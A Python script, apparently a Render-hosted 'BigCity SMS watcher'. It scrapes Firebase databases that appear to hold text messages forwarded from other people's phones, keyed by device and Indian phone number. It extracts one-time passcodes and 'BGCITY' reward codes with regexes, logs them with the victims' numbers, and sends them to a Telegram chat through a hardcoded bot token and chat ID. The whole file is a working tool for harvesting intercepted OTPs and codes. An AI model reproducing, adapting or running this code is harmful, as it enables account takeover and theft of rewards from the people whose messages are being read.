#!/usr/bin/env python3
"""
BigCity (JX-BGCITY) SMS watcher — Firebase RTDB scraper + Telegram alerts.
Render Web Service deployment ke liye Fully Fixed Code (No Port Lock Error).
"""

import json
import os
import re
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask

sys.stdout.reconfigure(encoding="utf-8")

import functools

print = functools.partial(print, flush=True)

# ═══════════════ CONFIGURATION ═══════════════
BASE = os.path.dirname(os.path.abspath(__file__))
FB_FILE = os.path.join(BASE, "bigcity_firebase.txt")
SEEN_FILE = os.path.join(BASE, "bigcity_seen.json")
REWARD_LOG = os.path.join(BASE, "bigcity_rewards.txt")

# Environment Variables se fetch karega, warna hardcoded fallback use karega
BOT_TOKEN = os.getenv("BOT_TOKEN", "8943799620:AAFunCEcFqGr4hghvchel49sp9KOSubYS2g")
CHAT_ID = os.getenv("CHAT_ID", "8645142724")

REDEEM_URL = "https://www.worldpharmacistdaybyopellarewards.com/"
FILTER = "BGCITY"
INTERVAL = 15          # poll seconds
BASE_LAST = 30         # baseline per-device msgs
POLL_LAST = 10         # har poll me per-device msgs
TG_REWARD_ONLY = True  # Telegram sirf Reward Code ke liye
DEFAULT_DBS = []
WORKERS = 20

OTP_PATTERNS = [
    re.compile(r"OTP to register is\s*(\d{4,8})", re.I),
    re.compile(r"OTP[:\s]+(?:is\s*)?(\d{4,8})", re.I),
    re.compile(r"(?:code|otp|key)[^\d]{0,20}(\d{6})", re.I),
    re.compile(r"\b(\d{6})\b"),
]

REWARD_PATTERNS = [
    re.compile(r"Reward\s*Code\s*is\s*\*?\s*([A-Za-z0-9][A-Za-z0-9\-]{2,40})", re.I),
]

# Flask App banayein (Render Health Check ke liye)
app = Flask(__name__)

@app.route("/")
def home():
    return "✅ BGCITY SMS Watcher Bot is Active and Running on Render!"

# ═══════════════ SCRAPER FUNCTIONS ═══════════════
def is_reward(sender, text):
    t = (text or "").lower()
    s = (sender or "").lower()
    if "worldpharmacistdaybyopellarewards" in t:
        return True
    if "reward" in t and "code" in t and ("bgcity" in s or "bigcity" in t):
        return True
    return False


def load_dbs():
    if os.path.exists(FB_FILE):
        out = []
        with open(FB_FILE, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split("|||")
                url = parts[0].strip().rstrip("/")
                key = parts[1].strip() if len(parts) > 1 else ""
                if url:
                    out.append((url, key))
        if out:
            return out
    return [(u, "") for u in DEFAULT_DBS]


def load_seen():
    try:
        with open(SEEN_FILE, encoding="utf-8") as f:
            return set(json.load(f))
    except Exception:
        return set()


def save_seen(seen):
    try:
        with open(SEEN_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(seen), f)
    except Exception:
        pass


def tg_check(session, token):
    try:
        r = session.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        d = r.json()
        if d.get("ok"):
            return True, "@" + str(d["result"].get("username", "?"))
        return False, str(d)[:100]
    except Exception as e:
        return False, str(e)[:100]


def tg_send(session, token, chat, text):
    try:
        r = session.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat, "text": text},
            timeout=15,
        )
        return r.status_code == 200
    except Exception:
        return False


def format_tg(h):
    phone = f"+91{h['phone']}" if h["phone"] else h["device"][:12]
    meta = f"{phone} | {h['sender']} | {h['ts']}"
    if h["reward"]:
        return (
            f"🎁 BGCITY REWARD CODE!\n\n"
            f"Code: {h['reward']}\n"
            f"Redeem: {REDEEM_URL}\n\n"
            f"📱 {meta}"
        )
    if h["otp"]:
        return f"🔑 BGCITY OTP: {h['otp']}\n\n📱 {meta}"
    return f"📩 BGCITY msg ({h['sender']}):\n{h['text'][:300]}\n\n📱 {meta}"


def fb_get(session, base, path, key=""):
    url = f"{base}/{path}"
    if key:
        url += f"?auth={key}" if "?" not in url else f"&auth={key}"
    try:
        r = session.get(url, timeout=10)
        if r.status_code == 200:
            return True, r.json()
        return False, f"HTTP {r.status_code} {r.text[:120]}"
    except Exception as e:
        return False, f"ERR {str(e)[:80]}"


def extract_phone(dev):
    def valid(m):
        m = re.sub(r"[^0-9]", "", str(m or ""))
        return m if len(m) == 10 and m[0] in "6789" else ""

    if not isinstance(dev, dict):
        return ""
    for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number"):
        if dev.get(k):
            r = valid(dev[k])
            if r:
                return r
    for container in ("sims", "action", "sms", "smsCommand", "webhookEvent", "sendSms", "commands"):
        c = dev.get(container)
        items = []
        if isinstance(c, dict):
            items = list(c.values()) + [c]
        elif isinstance(c, list):
            items = c
        for it in items:
            if isinstance(it, dict):
                for k in ("phoneNumber", "number", "phone", "msisdn", "to", "mobile", "subId"):
                    if it.get(k):
                        r = valid(it[k])
                        if r:
                            return r
    return ""


def extract_otp(text):
    for rx in OTP_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1)
    return ""


def extract_reward(text):
    for rx in REWARD_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1).rstrip(".*")
    return ""


def is_hit(sender, text, needle):
    n = needle.lower()
    return n in (sender or "").lower() or n in (text or "").lower() or "worldpharmacistday" in (text or "").lower()


def scan_db(session, base, key, last, needle):
    ok, clients = fb_get(session, base, "clients.json", key)
    if not ok:
        return 0, 0, [], clients
    if not isinstance(clients, dict):
        return 0, 0, [], "empty/invalid clients"

    dev_ids = list(clients.keys())
    phones = {d: extract_phone(clients[d]) for d in dev_ids}

    def fetch(did):
        ok2, data = fb_get(
            session,
            base,
            f'messages/{did}.json?orderBy="$key"&limitToLast={last}',
            key,
        )
        return did, ok2, data

    msgs, hits = 0, []
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(fetch, d): d for d in dev_ids}
        for fu in as_completed(futs):
            did = futs[fu]
            try:
                _, ok2, data = fu.result()
            except Exception:
                continue
            if not ok2 or not isinstance(data, dict):
                continue
            for mk, m in data.items():
                if not isinstance(m, dict):
                    continue
                text = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
                sender = str(m.get("sender", "") or m.get("from", "") or m.get("address", ""))
                if not text.strip():
                    continue
                msgs += 1
                if is_hit(sender, text, needle):
                    hits.append(
                        {
                            "db": base,
                            "device": did,
                            "phone": phones.get(did, ""),
                            "key": f"{base}|{did}|{mk}",
                            "msgid": str(mk),
                            "sender": sender,
                            "ts": str(m.get("dateTime", "") or m.get("time", "") or m.get("timestamp", "")),
                            "text": text,
                            "otp": extract_otp(text),
                            "reward": extract_reward(text),
                        }
                    )
    return len(dev_ids), msgs, hits, ""


def log_reward(h):
    try:
        with open(REWARD_LOG, "a", encoding="utf-8") as f:
            f.write(
                f"{h['ts']} | +91{h['phone'] or '?'} | "
                f"{h['reward'] or 'NO-CODE-PARSE'} | {h['sender']} | "
                f"{h['device']} | {h['db']}\n"
            )
    except Exception:
        pass


def send_tg(tg, h):
    if tg and tg.get("ok"):
        if tg_send(tg["session"], tg["token"], tg["chat"], format_tg(h)):
            print("  [tg] Telegram bhej diya ✓")
        else:
            print("  [tg] bhejne me fail ✗")


def print_hit(h, tg=None):
    reward = bool(h["reward"]) or is_reward(h["sender"], h["text"])
    phone = f"+91{h['phone']}" if h["phone"] else h["device"][:12]
    if reward:
        print("\n" + "!" * 70)
        print(f"🎁🎁🎁 REWARD CODE AAYA! [{h['sender']}] {h['ts']}")
        print(f"  phone: {phone}")
        print(f"  CODE: {h['reward'] or 'parse nahi hua — text dekho'}")
        print(f"  REDEEM: {REDEEM_URL}")
        print(f"  full: {h['text'][:400]}")
        print("!" * 70)
        log_reward(h)
        print(f"  [log] {REWARD_LOG} me likh diya")
        send_tg(tg, h)
        return
    print("\n" + "=" * 70)
    print(f"[HIT] {h['sender']}  {h['ts']}")
    print(f"  db: {h['db'][:60]}")
    print(f"  device: {h['device']}" + (f"  phone: +91{h['phone']}" if h['phone'] else ""))
    print(f"  text: {h['text'][:400]}")
    if h["otp"]:
        print(f"  >>> OTP: {h['otp']}")
    if not TG_REWARD_ONLY:
        send_tg(tg, h)


def start_watcher():
    print("=" * 70)
    print("  BGCITY SMS Monitor — Firebase + Telegram (Render Live Active)")
    print("=" * 70)

    dbs = list(dict.fromkeys(load_dbs()))
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    tg = {"ok": False, "session": session, "token": "", "chat": 0}
    if BOT_TOKEN and CHAT_ID:
        ok, info = tg_check(session, BOT_TOKEN)
        if ok:
            tg = {"ok": True, "session": session, "token": BOT_TOKEN, "chat": CHAT_ID}
            print(f"[tg] connected: {info} -> chat {CHAT_ID}")
            if tg_send(session, BOT_TOKEN, CHAT_ID, "✅ BGCITY Monitor STARTED (Render) — naye OTP/Reward Code yahin aayenge."):
                print("[tg] test msg OK ✓ (Telegram live hai)")
            else:
                tg["ok"] = False
                print("[tg] test msg FAIL ✗")
        else:
            print(f"[tg] token fail ({info})")

    print(f"\nWatching {len(dbs)} DBs, filter='{FILTER}', har {INTERVAL}s poll.")
    seen = load_seen()

    for base, key in dbs:
        nd, nm, hits, err = scan_db(session, base, key, BASE_LAST, FILTER)
        for h in hits:
            seen.add(h["key"])
        print(f"  base {base[:55]}: devices={nd} msgs={nm} old_hits={len(hits)}" + (f" X {err}" if err else ""))
    save_seen(seen)

    print("\nLIVE... naya BGCITY msg = console + Telegram.")

    while True:
        try:
            time.sleep(INTERVAL)
            for base, key in dbs:
                try:
                    _, _, hits, _ = scan_db(session, base, key, POLL_LAST, FILTER)
                except Exception as e:
                    print(f"  [warn] {base[:50]}: {str(e)[:60]}")
                    continue
                fresh = [h for h in hits if h["key"] not in seen]
                for h in sorted(fresh, key=lambda x: x["msgid"]):
                    print_hit(h, tg)
                    seen.add(h["key"])
                if fresh:
                    save_seen(seen)
        except Exception as err:
            print(f"Loop Error: {err}")


if __name__ == "__main__":
    # Background Thread me Scraper Monitor ko start karein
    thread = threading.Thread(target=start_watcher, daemon=True)
    thread.start()

    port = int(os.environ.get("PORT", 10000))
    print(f"[*] Production Web Server starting on port {port}...")

    # Native Python WSGI server with SO_REUSEADDR option
    from wsgiref.simple_server import WSGIServer, make_server

    class ReusePortServer(WSGIServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()

    httpd = make_server("0.0.0.0", port, app, server_class=ReusePortServer)
    httpd.serve_forever()
